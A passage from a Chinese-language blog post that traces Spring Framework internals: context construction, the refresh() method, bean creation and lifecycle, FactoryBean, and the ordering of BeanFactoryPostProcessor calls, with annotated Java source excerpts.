ROLE_INFRASTRUCTURE代表这是spring内部的，并非用户定义的\tdefinition.setRole(BeanDefinition.ROLE_INFRASTRUCTURE);       // 调用DefaultListableBeanFactory的registerBeanDefinition方法\tregistry.registerBeanDefinition(beanName, definition);\treturn new BeanDefinitionHolder(definition, beanName);&#125;\n\nBeanDefinitionScanner的初始化由于常规使用方式是不会用到ApplicationContext里面的扫描器scanner的，因为这里的scanner仅仅是为了程序员可以手动调用AnnotationConfigApplicationContext对象的scan方法去扫描包。所以这里就不看scanner是如何被实例化的了。\n\n继续回到构造方法！\n我们已经走完了this()方法了，他的任务是帮助父类构造方法构建，完成BeanFactory的构造。\n之后进行BeanDefinitionReader和BeanDefinitionScanner的初始化。\n还记得我们最开始的那个图吗？\n\n我们需要的三个类已经完成装载了。同时我们也知道在进行BeanDefinitionReader初始化的时候，进行了很重要的一些后置处理器的注册，便于在后面直接getBean生产出来。\n那么在ApplicationContext的构造函数中，我们就到了下一个方法了！\nregister(annotatedClasses)public AnnotationConfigApplicationContext(Class&lt;?&gt;... annotatedClasses) &#123;\t//调用构造函数\tthis();\t//注册我们的配置类\tregister(annotatedClasses);\t//IOC容器刷新接口\trefresh();&#125;public void register(Class&lt;?&gt;... annotatedClasses) &#123;\tAssert.notEmpty(annotatedClasses, &quot;At least one annotated class must be specified&quot;);       //调用BeanDefinitionReader来帮助注册\tthis.reader.register(annotatedClasses);&#125;\n\n我们接着看读取器内的源码\npublic void register(Class&lt;?&gt;... annotatedClasses) &#123;       //如果多个配置类那就依次进行注册配置类\tfor (Class&lt;?&gt; annotatedClass : annotatedClasses) &#123;\t\tregisterBean(annotatedClass);\t&#125;&#125;public void registerBean(Class&lt;?&gt; annotatedClass) &#123;\t//依旧调用       doRegisterBean(annotatedClass, null, null, null);&#125;   &lt;T&gt; void doRegisterBean(Class&lt;T&gt; annotatedClass, @Nullable Supplier&lt;T&gt; instanceSupplier, @Nullable String name,   @Nullable Class&lt;? extends Annotation&gt;[] qualifiers, BeanDefinitionCustomizer... definitionCustomizers) &#123;       //存储@Configuration注解注释的类 得到对应的类定义       AnnotatedGenericBeanDefinition abd = new AnnotatedGenericBeanDefinition(annotatedClass);       //判断是否需要跳过注解，spring中有一个@Condition注解，当不满足条件，这个bean就不会被解析       if (this.conditionEvaluator.shouldSkip(abd.getMetadata())) &#123;           return;       &#125;       abd.setInstanceSupplier(instanceSupplier);       //解析bean的作用域，如果没有设置的话，默认为单例       ScopeMetadata scopeMetadata = this.scopeMetadataResolver.resolveScopeMetadata(abd);       abd.setScope(scopeMetadata.getScopeName());       //获得beanName       String beanName = (name != null ? name : this.beanNameGenerator.generateBeanName(abd, this.registry));              //解析通用注解，填充到AnnotatedGenericBeanDefinition       //解析的注解为Lazy，Primary，DependsOn，Role，Description       AnnotationConfigUtils.processCommonDefinitionAnnotations(abd);       //限定符处理       if (qualifiers != null) &#123;       for (Class&lt;? extends Annotation&gt; qualifier : qualifiers) &#123;           //Primary注解           if (Primary.class == qualifier) &#123;               abd.setPrimary(true);           &#125;           //Lazy注解           else if (Lazy.class == qualifier) &#123;               abd.setLazyInit(true);           &#125;           else &#123;               abd.addQualifier(new AutowireCandidateQualifier(qualifier));           &#125;       &#125;       &#125;       for (BeanDefinitionCustomizer customizer : definitionCustomizers) &#123;       customizer.customize(abd);       &#125;       //再次封装为BeanDefinition       BeanDefinitionHolder definitionHolder = new BeanDefinitionHolder(abd, beanName);       definitionHolder = AnnotationConfigUtils.applyScopedProxyMode(scopeMetadata, definitionHolder, this.registry);       //注册，最终会调用DefaultListableBeanFactory中的registerBeanDefinition方法去注册，       //DefaultListableBeanFactory维护着一系列信息，比如beanDefinitionNames，beanDefinitionMap       //beanDefinitionNames是一个List&lt;String&gt;,用来保存beanName       //beanDefinitionMap是一个Map,用来保存beanName和beanDefinition       BeanDefinitionReaderUtils.registerBeanDefinition(definitionHolder, this.registry);   &#125;\n\n到这里我们就大致了解了如何注册完配置类的了，主要依靠阅读器来帮助注册，然后一直往下走，确定注册的配置，如何加载、是否多个配置等等，最后依靠registerBeanDefinition完成在BeanFactory中的注册\n到这，配置类就被解析为Bean定义注册完成了。\n\n@Condition注解怎么用？\n@Condition注解一般会放在一个Bean上。@Condition中需要指定一个类，该类需要实现Condition接口并实现matches()方法，如果该方法返回false那么该Bean就不会被解析。\n\nRefresh看到这里，Spring完成了实例化一个工厂、注册了一些内置的后置处理器和我们传进去的配置类。下面refresh方法才是真正的关键：\npublic AnnotationConfigApplicationContext(Class&lt;?&gt;... componentClasses) &#123;   // 调用无参构造函数，会先调用父类GenericApplicationContext的构造函数   this();   // 注册配置类   register(componentClasses);   // IOC容器刷新接口，非常重要的方法   refresh();&#125;\n\n会调用到AbstractApplicationContext中的refresh方法：\npublic void refresh() throws BeansException, IllegalStateException &#123;   synchronized (this.startupShutdownMonitor) &#123;      // 刷新预处理      // 保存了容器的启动时间、启动标志等信息      // 还创建了一个早期事件监听器对象，和一个早期待发布的事件集合      // 什么是【早期事件】？      // 就是事件监听器还没有注册到多播器上的时候都称为早期事件\t  // 早期事件不需要手动发布，会自动发布，发布完早期事件就不存在了      prepareRefresh();      // 最终获得DefaultListableBeanFactory      // DefaultListableBeanFactory实现了ConfigurableListableBeanFactory接口      // 1. 对于注解方式来说，这里几乎什么也没干，Bean定义的解析在后面的后置处理器中      // 2. 对于xml方式来说，在这里解析Bean为Bean定义，是一种耦合的方式      ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();      // 一些准备工作：      // 1. 添加了两个Bean后置处理器      //    (1) ApplicationContextAwareProcessor用于Bean初始化阶段执行一些Aware      //    (2) ApplicationListenerDetector解析接口方式的事件监听器      // 2. 还设置了忽略自动装配和允许自动装配的接口，比如：      //    可以在Bean中@Autowired注入ApplicationContext，就是在这里设置的      // 3. 注册了一些内部的Bean，这个无关紧要      prepareBeanFactory(beanFactory);      try &#123;         // 空方法，给子类实现         postProcessBeanFactory(beanFactory);         // 调用BeanFactory的后置处理器ConfigurationClassPostProcessor处理配置类         // 这是非常关键的一步，我们后续再详细分析         // 这里就会将所有的Bean都封装为Bean定义         invokeBeanFactoryPostProcessors(beanFactory);         // 实例化Bean的后置处理器（注意和BeanFactory的后置处理器区别）例如：         // 1. AutowiredAnnotationBeanPostProcessor处理@Autowired注解修饰的bean并注入 \t\t\t // 2. RequiredAnnotationBeanPostProcessor处理被@Required注解修饰的方法 \t\t\t\t\t //\t3. CommonAnnotationBeanPostProcessor处理@PreDestroy、@PostConstruct、\t          //    @Resource等多个注解。         registerBeanPostProcessors(beanFactory);         // 初始化国际化资源，可忽略         initMessageSource();         // 初始化事件多播器，后续再详细分析         initApplicationEventMulticaster();         // 留个子类实现，SpringBoot从这个方法进行启动Tomcat         onRefresh();         // 注册监听器，后续再详细分析         registerListeners();         // 实例化剩余非懒加载的单例Bean（包括Bean的后置处理器）         // 本结我们只简单看一下该方法，其它重要的我们单独分析         finishBeanFactoryInitialization(beanFactory);         // refresh做完之后需要做的其他事情：         // 1. 清除上下文资源缓存（如扫描中的ASM元数据）         // 2. 初始化上下文的生命周期处理器，并刷新（找出Spring容器中实现了Lifecycle接口的bean并\t\t\t  //\t执行start()方法）          // 3. 发布ContextRefreshedEvent事件告知对应的ApplicationListener进行响应的操作         // SpringCloud是从这里启动的         finishRefresh();      &#125;      catch (BeansException ex) &#123;         if (logger.isWarnEnabled()) &#123;            logger.warn(&quot;Exception encountered during context initialization - &quot; +                  &quot;cancelling refresh attempt: &quot; + ex);         &#125;         // Destroy already created singletons to avoid dangling resources.         destroyBeans();         // Reset &#x27;active&#x27; flag.         cancelRefresh(ex);         // Propagate exception to caller.         throw ex;      &#125;      finally &#123;         // Reset common introspection caches in Spring&#x27;s core, since we         // might not ever need metadata for singleton beans anymore...         resetCommonCaches();      &#125;   &#125;&#125;\n\n这里完成了BeanFactory后置处理器的调用、Bean后置处理器的注册、有关事件和国际化的初始化配置，最后通过finishBeanFactoryInitialization实例化所有的单例Bean。本结我们只简单分析最后一步Bean的创建流程，其它重要的我们会单独分析。\n\n\n题外话：源码真是折磨人，比AQS还折磨的多\n下面是刚刚初始化的简略…简略图\n\n\n现在我们接着看更下层的。\nBean的创建ApplicationContext的初始化完毕，所有的Bean都被封装成Bean定义了，下面就由BeanFactory来实例化Bean。\n准备工作这个流程从上面refresh中调用finishBeanFactoryInitialization方法开始：\nprotected void finishBeanFactoryInitialization(ConfigurableListableBeanFactory beanFactory) &#123;\t// 为我们的bean工厂创建类型转化器  Convert\tif (beanFactory.containsBean(CONVERSION_SERVICE_BEAN_NAME) &amp;&amp;\t\t\tbeanFactory.isTypeMatch(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class)) &#123;\t\tbeanFactory.setConversionService(\t\t\t\tbeanFactory.getBean(CONVERSION_SERVICE_BEAN_NAME, ConversionService.class));\t&#125;\t....\t// Stop using the temporary ClassLoader for type matching.\tbeanFactory.setTempClassLoader(null);\t//冻结所有的 bean 定义 ， 说明注册的 bean 定义将不被修改或任何进一步的处理       //这里是为了防止后置处理器进行修改\tbeanFactory.freezeConfiguration();\t//实例化剩余的单实例bean\tbeanFactory.preInstantiateSingletons();&#125;\n\n接下来我们看preInstantiateSingletons来实例化Bean\n@Overridepublic void preInstantiateSingletons() throws BeansException &#123;    if (logger.isDebugEnabled()) &#123;        logger.debug(&quot;Pre-instantiating singletons in &quot; + this);    &#125;    //获取我们容器中所有bean定义的名称    //得到了所有的Bean定义，下面进行实例化Bean    List&lt;String&gt; beanNames = new ArrayList&lt;&gt;(this.beanDefinitionNames);    //循环我们所有的bean定义名称    for (String beanName : beanNames) &#123;        //合并我们的bean定义，转换为统一的RootBeanDefinition类型(在)， 方便后续处理        RootBeanDefinition bd = getMergedLocalBeanDefinition(beanName);        /**\t\t\t * 根据bean定义判断是不是抽象的&amp;&amp; 不是单例的 &amp;&amp;不是懒加载的\t\t\t */        if (!bd.isAbstract() &amp;&amp; bd.isSingleton() &amp;&amp; !bd.isLazyInit()) &#123;            //是不是工厂bean            if (isFactoryBean(beanName)) &#123;                // 是factoryBean会先生成实际的bean  &amp;beanName 是用来获取实际bean的                // FactoryBean通过getObject方法生成其他类型Bean的时候时                // 如果BeanName前面加了&amp;符号，返回FactoryBean自身类型的对象                Object bean = getBean(FACTORY_BEAN_PREFIX + beanName);                if (bean instanceof FactoryBean) &#123;                    final FactoryBean&lt;?&gt; factory = (FactoryBean&lt;?&gt;) bean;                    boolean isEagerInit;                    if (System.getSecurityManager() != null &amp;&amp; factory instanceof SmartFactoryBean) &#123;                        isEagerInit = AccessController.doPrivileged(                            (PrivilegedAction&lt;Boolean&gt;)                            ((SmartFactoryBean&lt;?&gt;) factory)::isEagerInit,                            getAccessControlContext());                    &#125;                    else &#123;                        isEagerInit = (factory instanceof SmartFactoryBean &amp;&amp;                                       ((SmartFactoryBean&lt;?&gt;) factory).isEagerInit());                    &#125;                    //上面都是一系列的判断                    //调用真正的getBean的流程                    if (isEagerInit) &#123;                        getBean(beanName);                    &#125;                &#125;            &#125;            else &#123;//非工厂Bean 就是普通的bean                //其实现在是么有Bean的 有的只是Bean定义                //当调用getBean时会获取Bean定义创建Bean                getBean(beanName);            &#125;        &#125;    &#125;    //或有的bean的名称 ...........到这里所有的单实例的bean已经记载到单实例bean到缓存中    for (String beanName : beanNames) &#123;        //从单例缓存池中获取所有的对象        Object singletonInstance = getSingleton(beanName);        //判断当前的bean是否实现了SmartInitializingSingleton接口        //这里会执行实现SmartInitializingSingleton接口的afterSingletonsInstantiated方法        .....    &#125;&#125;\n\nFactoryBean和BeanFactory\nFactoryBean和BeanFactory的区别：\n\nBeanFactory是Spring的核心Bean工厂，用于生产Bean。\nFactoryBean是指实现了FactoryBean接口的Bean，是一种工厂Bean。它实现了getObject()方法返回其它自定义类型的Bean，Spring的IOC容器会调用其getObject()方法获取Bean。我们举一个例子：\n\n// FactoryBean类型的Bean@Componentpublic class UserFactoryBean implements FactoryBean&lt;User&gt;&#123;    \t// getObject方法中生产真正的Bean    @Override    public User getObject() throws Exception &#123;        User user = new User();        user.setName(&quot;liduoan&quot;);        return user;    &#125;    @Override    public Class&lt;?&gt; getObjectType() &#123;        return User.class;    &#125;&#125;\n\n测试方法：\npublic static void main(String[] args) &#123;    // 创建ApplicationContext    AnnotationConfigApplicationContext ctx =            new AnnotationConfigApplicationContext();    // 获取User类型的Bean    User user = ctx.getBean(&quot;user&quot;, User.class);    System.out.println(user.getName());    // 获取Bean时加&amp;号，可以获得对应的FactoryBean类型的Bean    UserFactoryBean bean = (UserFactoryBean) ctx.getBean(&quot;&amp;user&quot;);&#125;\n\n这是一种典型的工厂模式，比如大家熟悉的SqlSessionFactoryBean就是这样一种工厂Bean。\n\n最后还是使用getBean来真正实例化Bean\npublic Object getBean(String name) throws BeansException &#123;    // 调用doGetBean方法    return doGetBean(name, null, null, false);&#125;protected &lt;T&gt; T doGetBean(final String name, @Nullable final Class&lt;T&gt; requiredType,                          @Nullable final Object[] args, boolean typeCheckOnly) throws BeansException &#123;    // 得到真实的bean的名字    final String beanName = transformedBeanName(name);    Object bean;    // 先从容器缓存中获取Bean，拿到了直接返回，没有拿到再创建    Object sharedInstance = getSingleton(beanName);    // 如果从缓存中获取到Bean    if (sharedInstance != null &amp;&amp; args == null) &#123;        ...            // 直接获取bean            bean = getObjectForBeanInstance(sharedInstance, name, beanName, null);    &#125;    // 没有从缓存中获取到Bean    else &#123;        // 如果是多例bean并且正在创建，则会抛出异常        if (isPrototypeCurrentlyInCreation(beanName)) &#123;            throw new BeanCurrentlyInCreationException(beanName);        &#125;        // 获取父工厂，SpringMVC中会用到        BeanFactory parentBeanFactory = getParentBeanFactory();        // 这里省略        if (!typeCheckOnly) &#123;            // 将当前bean标记为正在创建            markBeanAsCreated(beanName);        &#125;        try &#123;            final RootBeanDefinition mbd = getMergedLocalBeanDefinition(beanName);            checkMergedBeanDefinition(mbd, beanName, args);            // 判断DependsOn注解            // @DependsOn:如果A依赖B，则B会被先加载            String[] dependsOn = mbd.getDependsOn();            if (dependsOn != null) &#123;                for (String dep : dependsOn) &#123;                    ...                         registerDependentBean(dep, beanName);                    try &#123;                        // 优先加载所有依赖的Bean                        getBean(dep);                    &#125;                    ...                &#125;                // 创建单例bean                if (mbd.isSingleton()) &#123;                    // 调用DefaultSingletonBeanRegistry的getSingleton方法                    // lambda表达式实现了ObjectFactory接口的getObject方法                    // 将getObject方法方法作为参数传给getSingleton方法                    // 在getSingleton方法中会调用这个getObject方法创建Bean                    sharedInstance = getSingleton(beanName, () -&gt; &#123;                        try &#123;                            // getSingleton回调createBean方法创建Bean                            // 这里调用了第一个Bean的后置处理器                            return createBean(beanName, mbd, args);                        &#125;                        catch (BeansException ex) &#123;                            destroySingleton(beanName);                            throw ex;                        &#125;                    &#125;);                    bean = getObjectForBeanInstance(sharedInstance, name, beanName, mbd);                &#125;                // 省略代码                return (T) bean;            &#125;\n\n正式开始最后调用createBean完成创建\nprotected Object createBean(String beanName, RootBeanDefinition mbd, @Nullable Object[] args)    throws BeanCreationException &#123;    ...        try &#123;            // 调用第一个bean后置处理器，此时bean还没有创建，这里可以阻止bean的创建            Object bean = resolveBeforeInstantiation(beanName, mbdToUse);            if (bean != null) &#123;                // 如果后置处理器创建了bean直接返回                return bean;            &#125;        &#125;    catch (Throwable ex) &#123;        throw new BeanCreationException(mbdToUse.getResourceDescription(), beanName,                                        &quot;BeanPostProcessor before instantiation of bean failed&quot;, ex);    &#125;    try &#123;        // 否则由Spring来创建，这个doCreateBean方法才是真正的创建过程        Object beanInstance = doCreateBean(beanName, mbdToUse, args);        if (logger.isTraceEnabled()) &#123;            logger.trace(&quot;Finished creating instance of bean &#x27;&quot; + beanName + &quot;&#x27;&quot;);        &#125;        return beanInstance;    &#125;    ...&#125;&#125;// 前面绕来绕去，终于来到了实例化Bean的地方// 这个方法完成了bean的实例化、填充属性和初始化过程protected Object doCreateBean(final String beanName, final RootBeanDefinition mbd, final @Nullable Object[] args)    throws BeanCreationException &#123;    BeanWrapper instanceWrapper = null;    if (mbd.isSingleton()) &#123;        instanceWrapper = this.factoryBeanInstanceCache.remove(beanName);    &#125;    if (instanceWrapper == null) &#123;        // 实例化bean：工厂方法、有参构造、无参构造        instanceWrapper = createBeanInstance(beanName, mbd, args);    &#125;    ...        try &#123;            // 属性赋值(调用setter方法)，这里完成了@Autowired的赋值            // 触发bean后置处理器postProcessAfterInstantiation方法            populateBean(beanName, mbd, instanceWrapper);            // 最后初始化，调用各种Aware和初始化方法            exposedObject = initializeBean(beanName, exposedObject, mbd);        &#125;    ...        return exposedObject;&#125;// Bean的初始化方法protected Object initializeBean(final String beanName, final Object bean, @Nullable RootBeanDefinition mbd) &#123;    ...        else &#123;            // invokeAwareMethods方法调用3个Aware            // 1. BeanNameAware            // 2. BeanClassLoaderAware            // 3. BeanFactoryAware            invokeAwareMethods(beanName, bean);        &#125;    Object wrappedBean = bean;    if (mbd == null || !mbd.isSynthetic()) &#123;        // 这里会调用bean后置处理器的postProcessBeforeInitialization方法        // 这里又会调用其余的一堆Aware        wrappedBean = applyBeanPostProcessorsBeforeInitialization(wrappedBean, beanName);    &#125;    try &#123;        // invokeInitMethods会调用Bean初始化的回调方法：        // 1. 实现InitializingBean接口类的afterPropertiesSet方法        // 2. initMethod指定的方法        invokeInitMethods(beanName, wrappedBean, mbd);    &#125;    ...        if (mbd == null || !mbd.isSynthetic()) &#123;            // 这里会调用后置处理器的PostProcessAfterInitialization方法            wrappedBean = applyBeanPostProcessorsAfterInitialization(wrappedBean, beanName);        &#125;    return wrappedBean;&#125;\n\n这里，Bean就实例化完成了，最后一步就是在DefaultSingletonBeanRegistry类中的getSingleton方法里，将创建完成的Bean放入单例池中。\nSpring中Bean的生命周期如下：\n\n实例化Bean对象，这个时候Bean的对象是非常低级的，基本不能够被我们使用，因为连最基本的属性都没有设置，@Autowired注解都是没有解析的 。\n填充属性，当做完这一步，Bean对象基本是完整的了，@Autowired注解已经解析完毕，依赖注入完成了。\n如果Bean实现了BeanNameAware接口，则调用setBeanName方法。\n如果Bean实现了BeanClassLoaderAware接口，则调用setBeanClassLoader方法。\n如果Bean实现了BeanFactoryAware接口，则调用setBeanFactory方法。\n调用BeanPostProcessor(Bean后置处理器)的postProcessBeforeInitialization方法。\n如果Bean实现了InitializingBean接口，调用afterPropertiesSet方法。\n如果Bean指定了initMethod方法，则调用Bean的initMethod指定的方法。\n调用BeanPostProcessor(Bean后置处理器)的postProcessAfterInitialization方法。当进行到这一步，Bean已经被准备就绪了，一直停留在应用的上下文中，直到被销毁。\n如果应用的上下文被销毁了，如果Bean实现了DisposableBean接口，则调用destroy方法，如果Bean指定了destoryMethod销毁方法也会被调用。\n\n后置处理器解析基于XML的解析过程基于XML的配置类解析过程和基于注解方式的有所不同，基于XML的配置类解析过程是一种耦合的解析方式，它没有使用到我们之前介绍的BeanFactory的后置处理器，也就是那些创世纪的类。XML方式配置类解析开始的地方在refresh方法中的此处：\n// xml是在这里解析Bean定义的，耦合方式ConfigurableListableBeanFactory beanFactory = obtainFreshBeanFactory();\n\n主要流程就是通过XML的读取器读取XML配置文件，将其封装为Document对象，最后将其解析为Bean定义。\n其中有一点需要注意。在XML配置方式中，我们经常使用这个注解(使用到了context命名空间)，像这样的注解会使用到命名空间。Spring在解析的过程中，会在spring-context模块的META-INF/spring.handlers文件中找到命名空间对应的处理器类，比如context命名空间的处理器如下：\n// Context命名空间处理器public class ContextNamespaceHandler extends NamespaceHandlerSupport &#123;\t@Override\tpublic void init() &#123;\t\tregisterBeanDefinitionParser(&quot;property-placeholder&quot;,                                      new PropertyPlaceholderBeanDefinitionParser());\t\tregisterBeanDefinitionParser(&quot;property-override&quot;,                                      new PropertyOverrideBeanDefinitionParser());\t\tregisterBeanDefinitionParser(&quot;annotation-config&quot;,                                     new AnnotationConfigBeanDefinitionParser());        // &lt;context:component-scan&gt;的解析器\t\tregisterBeanDefinitionParser(&quot;component-scan&quot;,                                      new ComponentScanBeanDefinitionParser());\t\tregisterBeanDefinitionParser(&quot;load-time-weaver&quot;,                                      new LoadTimeWeaverBeanDefinitionParser());\t\tregisterBeanDefinitionParser(&quot;spring-configured&quot;,                                      new SpringConfiguredBeanDefinitionParser());\t\tregisterBeanDefinitionParser(&quot;mbean-export&quot;,                                      new MBeanExportBeanDefinitionParser());\t\tregisterBeanDefinitionParser(&quot;mbean-server&quot;,                                     new MBeanServerBeanDefinitionParser());\t&#125;&#125;\n\n在&lt;context:component-scan&gt;的解析器ComponentScanBeanDefinitionParser中，就会通过XML的扫描器进行包扫描，最后将所有的Bean解析为Bean定义完成注册。XML具体解析过程大家可以自己查看源码，本文不过多介绍。\n基于注解的解析过程BeanFactory后置处理器相比于基于XML方式配置类的解析，基于注解的解析过程进行了解耦，通过BeanFactory的后置处理器进行解析，因此更高级一些。\nBeanFactory的后置处理器主要有下面两个作用：\n\n修改Bean定义：实现BeanFactoryPostProcessor接口，并且实现postProcessBeanFactory方法，可以拿到BeanFactory对象，从而修改Bean定义。\n注册Bean定义：实现BeanFactoryPostProcessor的子接口BeanDefinitionRegistryPostProcessor，并且实现postProcessBeanDefinitionRegistry方法，可以拿到BeanDefinitionRegistry对象，从而添加Bean定义。\n\n之前我们介绍了，在初始化扫描器Reader的时候会创建很多Spring内置的Bean工厂后置处理器，也就是创世纪的类。其中最最重要的是ConfigurationClassPostProcessor，它就是注解方式下解析配置类的Bean工厂后置处理器，没有它其它的Bean都不会存在。我么来看看它的结构：\n\n可以看到，BeanFactoryPostProcessor和BeanDefinitionRegistryPostProcessor它都实现了。另外它还实现了两个用于排序的接口，这两个接口主要用于决定执行顺序，在后续的代码中可以看到。\n后置处理器的执行顺序让我们进入源码来看吧\n首先我们知晓，在this.reader = new AnnotatedBeanDefinitionReader(this);中完成了一系列的后置处理器的定义。\n接下来\n// 调用我们的bean工厂的后置处理器.//1. 会在此将class扫描成beanDefinition  //2.bean工厂的后置处理器调用getBeaninvokeBeanFactoryPostProcessors(beanFactory);\n\n它会调用refresh方法里的invokeBeanFactoryPostProcessors方法来完成后置处理器的执行\n再次进去。\nprotected void invokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory beanFactory) &#123;\t//  获取两处存储BeanFactoryPostProcessor的对象 传入供接下来的调用\t//  1.当前Bean工厂，       //  2.和我们自己调用addBeanFactoryPostProcessor的自定义BeanFactoryPostProcessor       //  注意到getBeanFactoryPostProcessors()是我们对       //  context.addBeanFactoryPostProcessor(xxx);       //  当我们使用了上述的方法，才会在getBeanFactoryPostProcessors()返回\tPostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(beanFactory, getBeanFactoryPostProcessors());\t.........&#125;\n\n通过上面我们知道调用Bean工厂的后置处理器，里面的方法是Bean工厂和某个函数【大多数下这个参数为空\n那接着走吧\npublic static void invokeBeanFactoryPostProcessors(    ConfigurableListableBeanFactory beanFactory, List&lt;BeanFactoryPostProcessor&gt; beanFactoryPostProcessors) &#123;    //调用BeanDefinitionRegistryPostProcessor的后置处理器 Begin    // 定义已处理的后置处理器    Set&lt;String&gt; processedBeans = new HashSet&lt;&gt;();    //判断我们的beanFactory实现了BeanDefinitionRegistry(实现了该结构就有注册和获取Bean定义的能力）    if (beanFactory instanceof BeanDefinitionRegistry) &#123;        //强行把我们的bean工厂转为BeanDefinitionRegistry，因为待会需要注册Bean定义        BeanDefinitionRegistry registry = (BeanDefinitionRegistry) beanFactory;        //保存BeanFactoryPostProcessor类型的后置   BeanFactoryPostProcessor 提供修改        List&lt;BeanFactoryPostProcessor&gt; regularPostProcessors = new ArrayList&lt;&gt;();        //保存BeanDefinitionRegistryPostProcessor类型的后置处理器 BeanDefinitionRegistryPostProcessor 提供注册        List&lt;BeanDefinitionRegistryPostProcessor&gt; registryProcessors = new ArrayList&lt;&gt;();        //循环我们传递进来的beanFactoryPostProcessors        .......            //一般为空            //定义一个集合用户保存当前准备创建的BeanDefinitionRegistryPostProcessor            List&lt;BeanDefinitionRegistryPostProcessor&gt; currentRegistryProcessors = new ArrayList&lt;&gt;();        //第一步:去beanFactory容器中获取BeanDefinitionRegistryPostProcessor的bean的处理器名称        String[] postProcessorNames =            beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);        //循环筛选出来的匹配BeanDefinitionRegistryPostProcessor的类型名称        for (String ppName : postProcessorNames) &#123;            //判断是否实现了PriorityOrdered接口的  如果是就最优先去调用            if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) &#123;                //显示的调用getBean()的方式获取出该对象然后加入到currentRegistryProcessors集合中去                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));                //同时也加入到processedBeans集合中去                processedBeans.add(ppName);            &#125;        &#125;        //对currentRegistryProcessors集合中BeanDefinitionRegistryPostProcessor进行排序        sortPostProcessors(currentRegistryProcessors, beanFactory);        // 把当前的加入到总的里面去        registryProcessors.addAll(currentRegistryProcessors);        /**\t\t\t * 在这里典型的BeanDefinitionRegistryPostProcessor就是\t\t\t ConfigurationClassPostProcessor\t\t\t * 用于进行bean定义的加载 比如我们的包扫描，@import  等等。。。。。。。。。\t\t\t */        //这个方法很重要，后续再说        invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);        //调用完之后，马上clea掉        currentRegistryProcessors.clear();        //-----调用内置实现PriorityOrdered接口ConfigurationClassPostProcessor完毕--优先级No1-End------        //======================================================================================        //实现了优先级最高的Bean后置处理器的调用        //去容器中获取BeanDefinitionRegistryPostProcessor的bean的处理器名称（内置的和上面注册的）        postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);        //循环上一步获取的BeanDefinitionRegistryPostProcessor的类型名称        for (String ppName : postProcessorNames) &#123;            //表示没有被处理过,且实现了Ordered接口的            //!processedBeans.contains(ppName) 不在上面那个队列中            if (!processedBeans.contains(ppName) &amp;&amp; beanFactory.isTypeMatch(ppName, Ordered.class)) &#123;                //显示的调用getBean()的方式获取出该对象然后加入到currentRegistryProcessors集合中去                currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));                //同时也加入到processedBeans集合中去                processedBeans.add(ppName);            &#125;        &#125;        //对currentRegistryProcessors集合中BeanDefinitionRegistryPostProcessor进行排序        sortPostProcessors(currentRegistryProcessors, beanFactory);        //把他加入到用于保存到registryProcessors中        registryProcessors.addAll(currentRegistryProcessors);        //调用他的后置处理方法        invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);        //调用完之后，马上clea掉        currentRegistryProcessors.clear();        //--------调用自定义Order接口BeanDefinitionRegistryPostProcessor完毕-优先级No2-End---        //调用没有实现任何优先级接口的BeanDefinitionRegistryPostProcessor        //定义一个重复处理的开关变量 默认值为true        boolean reiterate = true;        //第一次就可以进来        while (reiterate) &#123;            //进入循环马上把开关变量给改为false            reiterate = false;            //去容器中获取BeanDefinitionRegistryPostProcessor的bean的处理器名称            postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, true, false);            //循环上一步获取的BeanDefinitionRegistryPostProcessor的类型名称            for (String ppName : postProcessorNames) &#123;                //没有被处理过的                if (!processedBeans.contains(ppName)) &#123;                    //显示的调用getBean()的方式获取出该对象然后加入到currentRegistryProcessors集合中去                    currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));                    //同时也加入到processedBeans集合中去                    processedBeans.add(ppName);                    //再次设置为true                    reiterate = true;                &#125;            &#125;            //对currentRegistryProcessors集合中BeanDefinitionRegistryPostProcessor进行排序            sortPostProcessors(currentRegistryProcessors, beanFactory);            //把他加入到用于保存到registryProcessors中            registryProcessors.addAll(currentRegistryProcessors);            //调用他的后置处理方法            invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);            //进行clear            currentRegistryProcessors.clear();        &#125;        //------------调用没有实现任何优先级接口自定义BeanDefinitionRegistryPostProcessor完毕--End-----        //调用 BeanDefinitionRegistryPostProcessor.postProcessBeanFactory方法        invokeBeanFactoryPostProcessors(registryProcessors, beanFactory);        //调用BeanFactoryPostProcessor 自设的（没有）        invokeBeanFactoryPostProcessors(regularPostProcessors, beanFactory);    &#125;    else &#123;        //若当前的beanFactory没有实现了BeanDefinitionRegistry 说明没有注册Bean定义的能力        // 那么就直接调用BeanDefinitionRegistryPostProcessor.postProcessBeanFactory方法        invokeBeanFactoryPostProcessors(beanFactoryPostProcessors, beanFactory);    &#125;    //---------------所有BeanDefinitionRegistryPostProcessor调用完毕--End----------------------    //--------------------------处理BeanFactoryPostProcessor --Begin--------------------------    //获取容器中所有的 BeanFactoryPostProcessor    String[] postProcessorNames =        beanFactory.getBeanNamesForType(BeanFactoryPostProcessor.class, true, false);    //保存BeanFactoryPostProcessor类型实现了priorityOrdered    List&lt;BeanFactoryPostProcessor&gt; priorityOrderedPostProcessors = new ArrayList&lt;&gt;();    //保存BeanFactoryPostProcessor类型实现了Ordered接口的    List&lt;String&gt; orderedPostProcessorNames = new ArrayList&lt;&gt;();    //保存BeanFactoryPostProcessor没有实现任何优先级接口的    List&lt;String&gt; nonOrderedPostProcessorNames = new ArrayList&lt;&gt;();    for (String ppName : postProcessorNames) &#123;        //processedBeans包含的话，表示在上面处理BeanDefinitionRegistryPostProcessor的时候处理过了        if (processedBeans.contains(ppName)) &#123;            // skip - already processed in first phase above        &#125;        //判断是否实现了PriorityOrdered 优先级最高        else if (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) &#123;            priorityOrderedPostProcessors.add(beanFactory.getBean(ppName, BeanFactoryPostProcessor.class));        &#125;        //判断是否实现了Ordered  优先级 其次        